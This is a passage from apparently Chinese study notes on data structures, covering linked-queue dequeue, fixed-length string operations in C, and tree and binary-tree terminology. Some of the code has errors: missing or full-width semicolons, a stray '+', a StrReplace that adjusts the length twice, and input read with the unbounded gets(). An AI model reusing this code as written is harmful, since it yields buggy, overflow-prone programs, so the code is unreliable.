<span class="title">DeQueue</span><span class="params">(LinkQueue* Q, DataType* e)</span> <span class="comment">//删除队头，用e返回其值</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">LinkListQ* p;</span><br><span class="line"><span class="keyword">if</span> (Q-&gt;front == Q-&gt;rear) <span class="comment">//队空</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line">p = Q-&gt;front-&gt;next; <span class="comment">//p指向队头元素</span></span><br><span class="line">*e = p-&gt;data; <span class="comment">//队头元素的值赋给e</span></span><br><span class="line">Q-&gt;front-&gt;next = p-&gt;next; <span class="comment">//原队头节点后继p-&gt;next赋给头节点后继</span></span><br><span class="line"><span class="keyword">if</span> (Q-&gt;rear == p)<span class="comment">/*p-&gt;next==NULL*/</span> <span class="comment">//队头等于队尾，删除后将rear指向头节点</span></span><br><span class="line">{</span><br><span class="line">Q-&gt;rear = Q-&gt;front; <span class="comment">//此时队空</span></span><br><span class="line">}</span><br><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="小结-4"><a class="markdownIt-Anchor" href="#小结-4"></a> 小结</h2><p>对于循环队列和链队列的比较，可以从两方面，从时间上看，它们基本操作都是常数时间，都为O(1)，从空间看，</p><p>循环队列必须有一个固定的长度，就有了存储元素个数和空间资源浪费的问题，而链队列不存在这个问题；尽管需</p><p>要一个指针域，需要空间，但是可以接受，所以空间上链队列更加灵活；</p><p>总的来说，在可以确定队列长度最大值的情况下，建议使用循环队列，无法估计队列长度时则用链队列；</p><p>下面要学习线性结构的最后一种 — 串； Waiting for me！Bye~</p><h1 id="串string"><a class="markdownIt-Anchor" href="#串string"></a> 串—String</h1><p>字符串，大家都不陌生对吧，学习C语言的时候就讲过了，编程题中常常遇到，这里所学习的串和字符串的用法基本一致，无非就是改改名称，优化算法，hhhh；</p><h2 id="定义-8"><a class="markdownIt-Anchor" href="#定义-8"></a> 定义</h2><p>串是由零个或多个字符组成的有限序列，又名叫字符串；</p><p>串中的字符数目n称为串的长度；</p><p>零个字符的串称为空串，可以用两双引号""表示，也可以用希腊字母Ø表示；</p><h2 id="串的抽象数据类型"><a class="markdownIt-Anchor" href="#串的抽象数据类型"></a> 串的抽象数据类型</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、StrAssign(S, *chars) <span class="comment">//生成一个值等于chars的串S</span></span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、StrCopy(S,T) <span class="comment">//串T复制得串S</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span>、StrLength(S) <span class="comment">//串S的长度，即S中的元素个数</span></span><br><span class="line"></span><br><span class="line"><span class="number">4</span>、StrCat(S,T) <span class="comment">//串T连接在串S后面</span></span><br><span class="line"></span><br><span class="line"><span class="number">5</span>、SubString(Sub,S,pos,len) <span class="comment">//用Sub返回串S的第pos个字符起长度为len的子串</span></span><br><span class="line"></span><br><span class="line"><span class="number">6</span>、StrIndex(S,T) <span class="comment">//若串S中存在与串T相同的子串，则返回它在串S中第一次出现的位置，否则返回代表错误的值</span></span><br><span class="line"></span><br><span class="line"><span class="number">7</span>、StrInsert(S,pos,T) <span class="comment">//在串S的第pos个字符插入串T</span></span><br><span class="line"></span><br><span class="line"><span class="number">8</span>、StrDelete(S,pos,len) <span class="comment">//从串S中删除第pos个字符起长度为len的子串</span></span><br><span class="line"></span><br><span class="line"><span class="number">9</span>、StrReplace(S,T,V) <span class="comment">//用串V替换串S中出现得到所有与T相等的不重叠子串</span></span><br><span class="line"></span><br><span class="line"><span class="number">10</span>、StrEmpty(S) <span class="comment">//若串S为空串，则返回1，否则返回0</span></span><br><span class="line"></span><br><span class="line"><span class="number">11</span>、StrCompare(S,T) <span class="comment">//若S&gt;T，则返回值&gt;0,若S=T，则返回值=0,若S&lt;T，则返回值&lt;0</span></span><br><span class="line"></span><br><span class="line"><span class="number">12</span>、StrClear(S) <span class="comment">//将串S清空</span></span><br><span class="line"></span><br><span class="line"><span class="number">13</span>、DispStr(S) <span class="comment">//显示串S的所有字符</span></span><br></pre></td></tr></tbody></table></figure><h2 id="串的存储结构"><a class="markdownIt-Anchor" href="#串的存储结构"></a> 串的存储结构</h2><p>串的存储结构也是分为顺序存储结构和链式存储结构，重点讲顺序存储结构，即定长顺序串；</p><h3 id="结构代码-3"><a class="markdownIt-Anchor" href="#结构代码-3"></a> 结构代码</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 1000</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line"><span class="keyword">char</span> ch[MAXSIZE];</span><br><span class="line"><span class="keyword">int</span> Len;</span><br><span class="line">}<span class="keyword">String</span>;</span><br></pre></td></tr></tbody></table></figure><h3 id="字符串长度"><a class="markdownIt-Anchor" href="#字符串长度"></a> 字符串长度</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">StrLength</span><span class="params">(<span class="keyword">String</span>* S)</span> <span class="comment">//求字符串S长度</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (S-&gt;ch[i] != <span class="string">'\0'</span>)</span><br><span class="line">{</span><br><span class="line">i++;</span><br><span class="line">}</span><br><span class="line">S-&gt;Len = i;</span><br><span class="line"><span class="keyword">return</span> (S-&gt;Len);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="建立新串"><a class="markdownIt-Anchor" href="#建立新串"></a> 建立新串</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CreateStr</span><span class="params">(<span class="keyword">String</span>* S)</span> <span class="comment">//建立一个新串</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">gets(S-&gt;ch);</span><br><span class="line">S-&gt;Len = StrLength(S);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="求子串函数"><a class="markdownIt-Anchor" href="#求子串函数"></a> 求子串函数</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">SubString</span><span class="params">(<span class="keyword">String</span>* S, <span class="keyword">String</span>* Sub, <span class="keyword">int</span> pos, <span class="keyword">int</span> len)</span> <span class="comment">//求子串函数，用Sub返回串S的第pos个字符起长度为len的子串</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> j;</span><br><span class="line"><span class="keyword">if</span> (pos&lt;<span class="number">1</span> || pos&gt;S-&gt;Len || len&lt;<span class="number">1</span> || len&gt;S-&gt;Len - pos + <span class="number">1</span>) <span class="comment">//范围错误</span></span><br><span class="line">{</span><br><span class="line">Sub-&gt;Len = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"ERROR\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; len; j++)</span><br><span class="line">{</span><br><span class="line">Sub-&gt;ch[j] = S-&gt;ch[pos + j - <span class="number">1</span>]; <span class="comment">//新串Sub赋值</span></span><br><span class="line">}</span><br><span class="line">Sub-&gt;ch[j] = <span class="string">'\0'</span>; <span class="comment">//新串尾部加上字符串结束标志</span></span><br><span class="line">Sub-&gt;Len = len; <span class="comment">//规定长度</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="删除子串"><a class="markdownIt-Anchor" href="#删除子串"></a> 删除子串</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">StrDelete</span><span class="params">(<span class="keyword">String</span>* S, <span class="keyword">int</span> i, <span class="keyword">int</span> l)</span> <span class="comment">//删除子串，在S中删除第i开始连续l个字符</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> k;</span><br><span class="line"><span class="keyword">if</span> (i + l - <span class="number">1</span> &gt; S-&gt;Len)</span><br><span class="line">{</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"子串超界"</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">for</span> (k = i + l - <span class="number">1</span>; k &lt; S-&gt;Len; k++, i++) <span class="comment">//从第i位开始删除长度为l个字符</span></span><br><span class="line">{</span><br><span class="line">S-&gt;ch[i - <span class="number">1</span>] = S-&gt;ch[k];</span><br><span class="line">}</span><br><span class="line">S-&gt;Len = S-&gt;Len - l; <span class="comment">//长度-l</span></span><br><span class="line">S-&gt;ch[S-&gt;Len] = <span class="string">'\0'</span>; <span class="comment">//新串尾部加上字符串结束标志</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="插入子串"><a class="markdownIt-Anchor" href="#插入子串"></a> 插入子串</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">StrInsert</span><span class="params">(<span class="keyword">String</span> *S,<span class="keyword">String</span> *T,<span class="keyword">int</span> i)</span> <span class="comment">//串S中第i个字符插入子串T</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> k;</span><br><span class="line"><span class="keyword">if</span> (i &gt; S-&gt;Len + <span class="number">1</span>)</span><br><span class="line">{</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"插入位置错误"</span>)；</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(S-&gt;Len+T-&gt;Len&gt;MAXSIZE)</span><br><span class="line">{</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"两串长度超过存储空间长度"</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>；</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">for</span> (k = S-&gt;Len - <span class="number">1</span>; k &gt;= i - <span class="number">1</span>; k--) <span class="comment">//将第i位开始的字符各向后移动T串长度</span></span><br><span class="line">{</span><br><span class="line">S-&gt;ch[T-&gt;Len + k] = S-&gt;ch[k];</span><br><span class="line">}</span><br><span class="line"><span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; T-&gt;Len; k++) <span class="comment">//将子串T插入到串S的第i位处</span></span><br><span class="line">{</span><br><span class="line">S-&gt;ch[i + k - <span class="number">1</span>] = T-&gt;ch[k];</span><br><span class="line">}</span><br><span class="line">S-&gt;Len = S-&gt;Len + T-&gt;Len; <span class="comment">//修改串S的长度</span></span><br><span class="line">S-&gt;ch[S-&gt;Len] = <span class="string">'\0'</span>; <span class="comment">//新串S尾部加上字符串结束标志</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="定位子串"><a class="markdownIt-Anchor" href="#定位子串"></a> 定位子串</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">StrIndex</span><span class="params">(<span class="keyword">String</span>* S, <span class="keyword">String</span>* T)</span> <span class="comment">//串的定位函数，若串S中存在与串T相同的子串，则返回它在串S中第一次出现的位置(第几个字符，不是下标)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, k;</span><br><span class="line"><span class="keyword">while</span> (i &lt; S-&gt;Len &amp;&amp; j &lt; T-&gt;Len) <span class="comment">//当两串指针没指向该串尾时进行比较</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span> (S-&gt;ch[i] == T-&gt;ch[j])</span><br><span class="line">{</span><br><span class="line">i++;</span><br><span class="line">j++;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line">i = i - j + <span class="number">1</span>;</span><br><span class="line">j = <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span> (j &gt;= T-&gt;Len) <span class="comment">//串S中有串T</span></span><br><span class="line">{</span><br><span class="line">k = i - T-&gt;Len + <span class="number">1</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line">k = <span class="number">-1</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> k;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="字符串比较"><a class="markdownIt-Anchor" href="#字符串比较"></a> 字符串比较</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">StrCompare</span><span class="params">(<span class="keyword">String</span>* S1, <span class="keyword">String</span>* S2)</span><span class="comment">//判断两个串是否相等</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, flag = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (S1-&gt;ch[i] != <span class="string">'\0'</span> &amp;&amp; S2-&gt;ch[i] != <span class="string">'\0'</span>) <span class="comment">//当两串没到串尾部时</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span> (S1-&gt;ch[i] != S2-&gt;ch[i]) <span class="comment">//两串对应位置的字符是否相同</span></span><br><span class="line">{</span><br><span class="line">flag = <span class="number">1</span>; <span class="comment">//标志置为1</span></span><br><span class="line"><span class="keyword">break</span>; <span class="comment">//结束循环</span></span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line">i++; <span class="comment">//计数</span></span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span> (flag == <span class="number">0</span> &amp;&amp; S1-&gt;Len == S2-&gt;Len) <span class="comment">//两串长度相同且所有字符都相同，两串相等</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> S1-&gt;ch[i] - S2-&gt;ch[i]; <span class="comment">//返回对应第一个不相同位置字符ASCII码差值</span></span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="字符串连接"><a class="markdownIt-Anchor" href="#字符串连接"></a> 字符串连接</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">StrCat</span><span class="params">(<span class="keyword">String</span>* S, <span class="keyword">String</span>* T)</span> <span class="comment">//连接函数</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> i, flag;</span><br><span class="line"><span class="keyword">if</span> (S-&gt;Len + T-&gt;Len &lt;= MAXSIZE) <span class="comment">//连接后串长小于MAXSIZE</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">for</span> (i = S-&gt;Len; i &lt; S-&gt;Len + T-&gt;Len; i++)</span><br><span class="line">{</span><br><span class="line">S-&gt;ch[i] = T-&gt;ch[i - S-&gt;Len]; <span class="comment">//赋值连接</span></span><br><span class="line">}</span><br><span class="line">S-&gt;ch[i] = <span class="string">'\0'</span>;</span><br><span class="line">S-&gt;Len += T-&gt;Len; <span class="comment">//长度相加</span></span><br><span class="line">flag = <span class="number">1</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (S-&gt;Len &lt; MAXSIZE) <span class="comment">//连接后串长大于MAXSIZE，但串S长度小于MAXSIZE，连接后串T部分字符序列被舍弃</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">for</span> (i = S-&gt;Len; i &lt; MAXSIZE; i++)</span><br><span class="line">{</span><br><span class="line">S-&gt;ch[i] = T-&gt;ch[i - S-&gt;Len];</span><br><span class="line">}</span><br><span class="line">S-&gt;Len = MAXSIZE;</span><br><span class="line">flag = <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span> <span class="comment">//串S的长度等于MAXSIZE，串T不被连接</span></span><br><span class="line">{</span><br><span class="line">flag = <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> flag;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="子串替换"><a class="markdownIt-Anchor" href="#子串替换"></a> 子串替换</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">StrReplace</span><span class="params">(<span class="keyword">String</span>* S, <span class="keyword">String</span>* T, <span class="keyword">String</span>* V)</span> <span class="comment">//子串替换，用串V替换串S中出现得到所有与T相等的不重叠子串</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> i, m, n, p, q;</span><br><span class="line">n = S-&gt;Len;</span><br><span class="line">m = T-&gt;Len;</span><br><span class="line">q = V-&gt;Len;</span><br><span class="line">p = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">do</span> {</span><br><span class="line">i = StrIndex(S, T); <span class="comment">//调用定位函数得到子串T在子串S的位置</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (i != <span class="number">-1</span>) <span class="comment">//当主串S有该子串T时</span></span><br><span class="line">{</span><br><span class="line">StrDelete(S, i, m); <span class="comment">//删除子串T</span></span><br><span class="line">StrInsert(S, V, i); <span class="comment">//插入子串V</span></span><br><span class="line">p = i + q;</span><br><span class="line">S-&gt;Len = S-&gt;Len + q - m; <span class="comment">//修改主串S的长度</span></span><br><span class="line">n = S-&gt;Len;+</span><br><span class="line">}</span><br><span class="line">} <span class="keyword">while</span> ((p &lt;= n - m + <span class="number">1</span>) &amp;&amp; (i != <span class="number">-1</span>));</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="小结-5"><a class="markdownIt-Anchor" href="#小结-5"></a> 小结</h2><p>串这部分内容呢比较简单，后面还有广义表和KMP算法，这里先不讲了；下周直接学非线性结构；</p><p>Bye Bye~</p><h1 id="树tree"><a class="markdownIt-Anchor" href="#树tree"></a> 树—Tree</h1><p>早就对 ”树“ 有所耳闻了，今日一会，果然名不虚传；</p><h2 id="树的定义"><a class="markdownIt-Anchor" href="#树的定义"></a> 树的定义</h2><h3 id="定义-9"><a class="markdownIt-Anchor" href="#定义-9"></a> 定义</h3><p>树（Tree）是n（n≥0）个结点的有限集；n=0时称为空树；在任意一棵非空树中：</p><p>(1) 有且仅有一个特定的称为根（Root）的结点；</p><p>(2) 当n&gt;1时，其余结点可分为m（m&gt;0）个互不相交的有限集T1、T2、…、Tm，其中每一个集合本身又是一棵</p><p>树，并且称为根的子树（SubTree）；</p><h3 id="树的表示方法"><a class="markdownIt-Anchor" href="#树的表示方法"></a> 树的表示方法</h3><p>1、树形表示法：使用一棵倒置的树表示，如下图（1）所示；</p><p>2、嵌套集合表示法：使用集合以及集合的包含关系描述树结构，如图（2）所示；</p><p>3、凹入表表示法：使用线段的伸缩关系描述树的结构，如图（3）所示；</p><p>4、广义表表示法：将树的根结点写在括号的左边 ，除根结点外的其余结点写在括号内并用逗号间隔来描述树的结</p><p>构，如图（4）所示；</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/%E6%A0%91%E7%9A%84%E8%A1%A8%E7%A4%BA%E6%96%B9%E6%B3%95.png" alt="树的表示方法"></p><h3 id="树的基本术语z"><a class="markdownIt-Anchor" href="#树的基本术语z"></a> 树的基本术语z</h3><p><strong>(１) 结点———树的结点包含一个数据元素及若干指向其子树的分支；</strong></p><p><strong>(２) 结点的度———结点所拥有的分支数目或后继结点个数称为该结点的度；</strong></p><p><strong>(３) 树的度———树中各结点度的最大值称为该树的度；</strong></p><p><strong>(４) 叶结点 (终端结点) ———度为零的结点称为叶结点；</strong></p><p><strong>(５) 分支结点 (非终端结点) ———度不为零的结点称为分支结点；</strong></p><p><strong>(６) 孩子、双亲结点———一个结点的子树的根称为该结点的孩子；该结点称为孩子的双亲；</strong></p><p><strong>( 7 ) 兄弟结点———同一双亲结点下的孩子结点互称为兄弟结点；</strong></p><p><strong>( 8 ) 堂兄弟———双亲互为兄弟的两个结点互称为堂兄弟；</strong></p><p><strong>( 9 ) 子孙结点———一个结点的所有子树中的结点称之为该结点的子孙结点；</strong></p><p><strong>(10) 祖先结点———从树根结点到达一个结点的路径上的所有结点称为该结点的祖先结点</strong></p><p><strong>(11) 结点的层次———树的根结点的层次为１，其余结点的层次等于它双亲结点的层次加１；（某结点在第L层，</strong></p><p><strong>它的子树的根就在L+1层）；</strong></p><p><strong>(12) 树的深度———树中结点的最大层次称为树的深度 (或高度)；</strong></p><p><strong>(13) 有序树和无序树———如果一棵树中的结点的各子树从左到右是有次序的， 即若交换了某结点各子树的相对</strong></p><p><strong>位置， 则构成了不同的树， 称这样的树为有序树，反之， 则为 无序树；</strong></p><p><strong>(14) 森林———ｍ (ｍ≥０) 棵互不相交树的集合称为森林；</strong></p><h2 id="二叉树"><a class="markdownIt-Anchor" href="#二叉树"></a> 二叉树</h2><h3 id="二叉树定义"><a class="markdownIt-Anchor" href="#二叉树定义"></a> 二叉树定义</h3><p><strong>二叉树（Binary Tree）是有n（n≥0）个结点的有限集合；该集合或者为空集（称为空二叉树），或者由一个</strong></p><p><strong>根结点和两颗互不相交的、分别称为根结点的左子树和右子树的二叉树组成；</strong></p><h3 id="二叉树的特点"><a class="markdownIt-Anchor" href="#二叉树的特点"></a> 二叉树的特点</h3><p><strong>1、每个结点最多有两棵子树，所以二叉树中不存在度大于2的结点；</strong></p><p><strong>2、左子树和右子树是有顺序的，次序不能任意颠倒；</strong></p><p><strong>3、即使树中某结点只有一颗子树，也要区分它是左子树还是右子树；</strong></p><h3 id="二叉树的基本形态"><a class="markdownIt-Anchor" href="#二叉树的基本形态"></a> 二叉树的基本形态</h3><p>二叉树具有5种基本形态：</p><p>1、空二叉树</p><p>2、只要一个根结点</p><p>3、根结点只有左子树</p><p>4、根结点只有右子树</p><p>5、根结点既有左子树又有右子树</p><h3 id="二叉树的性质"><a class="markdownIt-Anchor" href="#二叉树的性质"></a> 二叉树的性质</h3><p><strong>● 在二叉树的第i层上至多有2^(i-1)个结点（i≥0）;</strong></p><p><strong>● 深度为k的二叉树至多有2^k - 1个结点（k≥1）；</strong></p><p><strong>● 对任意一棵二叉树T， 如果其叶子结点数为n0，度为２的结点数为n2，则有n0 = n2+1;</strong></p><p><strong>● 具有ｎ个结点的完全二叉树的深度为[log2n]+1;([x]为不大于x的最大整数)</strong></p><p><strong>● 如果一棵有ｎ个结点的完全二叉树 (其深度为[log2n]+1) 的结点按层次编号 (从第1层到第[log2n]+1层，每层从左到右) 则对任一结点ｉ (1≤ｉ≤ｎ) 有:</strong></p><p>​<strong>➀ 如果 i＝1， 结点ｉ是根结点， 无双亲； 如果ｉ&gt;1， 则其双亲结点是结点i/2；</strong></p><p>​<strong>➁ 如果 2i&gt;ｎ， 则结点ｉ无左孩子， 该结点为叶子结点， 否则其左孩子是结点2i ；</strong></p><p>​<strong>➂ 如果 2i+1&gt;ｎ， 则结点ｉ无右孩子， 该结点为叶子结点， 否则其右孩子是结点 2i＋1；</strong></p><h3 id="特殊二叉树"><a class="markdownIt-Anchor" href="#特殊二叉树"></a> 特殊二叉树</h3><h4 id="斜树"><a class="markdownIt-Anchor" href="#斜树"></a> 斜树</h4><h5 id="定义-10"><a class="markdownIt-Anchor" href="#定义-10"></a> 定义</h5><p>所有的结点都是只有左子树的二叉树叫做左斜树，所有的结点都是只有右子树的二叉树叫做右斜树；这两者统称为</p><p>斜树；</p><h5 id="特点-2"><a class="markdownIt-Anchor" href="#特点-2"></a> 特点</h5><p>每一层都只有一个结点，结点的个数与二叉树的深度相同；</p><p>如图：</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/%E6%96%9C%E6%A0%91.png" alt="斜树"></p><h4 id="满二叉树"><a class="markdownIt-Anchor" 